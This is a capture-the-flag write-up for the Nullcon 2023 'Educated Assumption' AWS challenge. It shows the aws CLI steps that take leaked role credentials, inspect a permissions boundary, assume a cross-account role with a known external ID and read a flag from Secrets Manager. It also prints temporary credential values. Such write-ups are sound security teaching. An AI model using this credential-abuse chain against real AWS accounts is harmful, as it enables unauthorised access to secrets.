The goal of this challenge is to read the flag from AWS Secret Manager. The
ARN is known (arn:aws:secretsmanager:eu-central-1:562778112707:secret:secret-
flag-Educated-Assumption) and we got leaked AWS credential (access key ID,
secret access key, and session token). We could configure the local aws cli to
use the credential.

First, we want to know the associated identity of the credential.

```  
aws sts get-caller-identity  
```

```  
{  
   "UserId": "AROA22D7J5LEAHRVBGHEB:expose-credentials",  
   "Account": "743296330440",  
   "Arn": "arn:aws:sts::743296330440:assumed-role/role_for-lambda-to-assume-
role/expose-credentials"  
}  
```

The identity is AWS IAM role with name role_for-lambda-to-assume-role in the
account 743296330440. We need to find a way to use this role to read the
target secret ARN in the target account (562778112707).

It happened that this role has permission to call iam get-role to retrieve the
role’s information.

```  
aws iam get-role  
```

```  
{  
   "Role": {  
       "Path": "/",  
       "RoleName": "role_for-lambda-to-assume-role",  
       "RoleId": "AROA22D7J5LEAHRVBGHEB",  
       "Arn": "arn:aws:iam::743296330440:role/role_for-lambda-to-assume-role",  
       "CreateDate": "2023-08-17T18:06:08+00:00",  
       "AssumeRolePolicyDocument": {  
           "Version": "2012-10-17",  
           "Statement": [  
               {  
                   "Effect": "Allow",  
                   "Principal": {  
                       "Service": "lambda.amazonaws.com"  
                   },  
                   "Action": "sts:AssumeRole"  
               }  
           ]  
       },  
       "Description": "allows lambda to assume role",  
       "MaxSessionDuration": 3600,  
       "PermissionsBoundary": {  
           "PermissionsBoundaryType": "Policy",  
           "PermissionsBoundaryArn": "arn:aws:iam::743296330440:policy/permission-boundary_restrict-assumptions"  
       },  
       "Tags": [  
           {  
               "Key": "event",  
               "Value": "2023-nullcon-goa"  
           }  
       ],  
       "RoleLastUsed": {  
           "LastUsedDate": "2023-08-20T15:51:52+00:00",  
           "Region": "us-east-1"  
       }  
   }  
}  
```

There is a permission boundary defined with the policy with ARN
arn:aws:iam::743296330440:policy/permission-boundary_restrict-assumptions.
Fortunately, the role has permission to call iam get-policy and iam get-
policy-version to gather further information about the policy.

```  
aws iam get-policy --policy-arn arn:aws:iam::743296330440:policy/permission-
boundary_restrict-assumptions  
```

```  
{  
   "Policy": {  
       "PolicyName": "permission-boundary_restrict-assumptions",  
       "PolicyId": "ANPA22D7J5LEOFCVAS7BA",  
       "Arn": "arn:aws:iam::743296330440:policy/permission-boundary_restrict-assumptions",  
       "Path": "/",  
       "DefaultVersionId": "v9",  
       "AttachmentCount": 0,  
       "PermissionsBoundaryUsageCount": 1,  
       "IsAttachable": true,  
       "Description": "permission-boundary_restrict-assumptions",  
       "CreateDate": "2023-08-17T17:53:41+00:00",  
       "UpdateDate": "2023-08-17T20:54:35+00:00",  
       "Tags": [  
           {  
               "Key": "event",  
               "Value": "2023-nullcon-goa"  
           }  
       ]  
   }  
}  
```

Use the default version ID of the policy (v9).

```  
aws iam get-policy-version --policy-arn
arn:aws:iam::743296330440:policy/permission-boundary_restrict-assumptions
--version-id v9  
```

```  
{  
   "PolicyVersion": {  
       "Document": {  
           "Version": "2012-10-17",  
           "Statement": [  
               {  
                   "Sid": "VisualEditor1",  
                   "Effect": "Allow",  
                   "Action": [  
                       "iam:GetRole",  
                       "iam:ListAttachedRolePolicies"  
                   ],  
                   "Resource": [  
                       "arn:aws:iam::743296330440:role/role_for-lambda-to-assume-role"  
                   ]  
               },  
               {  
                   "Sid": "VisualEditor3",  
                   "Effect": "Allow",  
                   "Action": [  
                       "iam:GetPolicyVersion",  
                       "iam:GetPolicy",  
                       "iam:GetRolePolicy"  
                   ],  
                   "Resource": [  
                       "arn:aws:iam::743296330440:policy/permission-boundary_restrict-assumptions",  
                       "arn:aws:iam::743296330440:policy/policy_role-lambda-sts-assume-all"  
                   ]  
               },  
               {  
                   "Sid": "VisualEditor2",  
                   "Effect": "Allow",  
                   "Action": "sts:AssumeRole",  
                   "Resource": "arn:aws:iam::*:role/role_to_secretsmanager_read_flag",  
                   "Condition": {  
                       "StringEquals": {  
                           "sts:ExternalId": "nullcon-external-id"  
                       }  
                   }  
               }  
           ]  
       },  
       "VersionId": "v9",  
       "IsDefaultVersion": true,  
       "CreateDate": "2023-08-17T20:54:35+00:00"  
   }  
}  
```

The policy allows current role to call sts assume-role to another role
(arn:aws:iam::*:role/role_to_secretsmanager_read_flag) as long as the sts API
call provides the valid external ID as parameter. From the challenge’s
description, we know that our target account is 562778112707 so we can try to
assume role as
arn:aws:iam::562778112707:role/role_to_secretsmanager_read_flag.

```  
aws sts assume-role --role-arn
arn:aws:iam::562778112707:role/role_to_secretsmanager_read_flag --external-id
nullcon-external-id --role-session-name test  
```

```  
{  
   "Credentials": {  
       "AccessKeyId": "ASIAYGCBQQLB6LECED5N",  
       "SecretAccessKey": "JcL1e4tEjbSrbiQDAqCQg3lFr3L6lzXRTXA23/ke",  
       "SessionToken": "FwoGZXIvYXdzEBoaDL/nBHvMklfD6eE0ICKoAevUg4uroF6nx2PDvy4maodQ5eglFirxa01TQC5uMeMB1ZtTj6ySBk5Zlc9glSjTC8+lbn17A/jAKwMqa1EIIRVPVnEYwvuNKGBAXLc94z/bdolIMyb2WdSDDmwDN5IieS4GbrGQx2SbdYO/yvcekvheIcPXKMX/Up/pe+BWU739fjrQ9r4OvtzWMwrMw2kh7pWAPAxmD6BTEuETStMdoZy2fHrzL+nvBCiwiYmnBjIt/lqEc+Qx4CHoyKcv9HtWX1UWk3E4epGdFBLFbIQz6MoEiUq7teutmirokfvT",  
       "Expiration": "2023-08-20T17:52:00+00:00"  
   },  
   "AssumedRoleUser": {  
       "AssumedRoleId": "AROAYGCBQQLB5IVBMQ3KF:test",  
       "Arn": "arn:aws:sts::562778112707:assumed-role/role_to_secretsmanager_read_flag/test"  
   }  
}  
```

We got temporary credential for the desired role. After reconfigure the local
aws cli to use the credential, we can try to do enumeration further to know
the permissions of this role but we can try to get the value of target secret
storage directly from the desired AWS Secret Manager ARN. From the target ARN,
we also know that the region is eu-central-1.

```  
aws secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:eu-
central-1:562778112707:secret:secret-flag-Educated-Assumption --region eu-
central-1  
```

```  
{  
   "ARN": "arn:aws:secretsmanager:eu-central-1:562778112707:secret:secret-
flag-Educated-Assumption-CMnnPK",  
   "Name": "secret-flag-Educated-Assumption",  
   "VersionId": "bffd4205-4fff-4b62-bc95-513d8ad4313d",  
   "SecretString": "{\"flag-Eductaed-Assumption\":\"ENO{uR-boundry_m@de-
me#Assume}\"}",  
   "VersionStages": [  
       "AWSCURRENT"  
   ],  
   "CreatedDate": "2023-08-17T22:36:06.243000+08:00"  
}  
```

Original writeup (https://hackmd.io/@vidner/nullcon-sksd#Educated-Assumption-
Cloudish).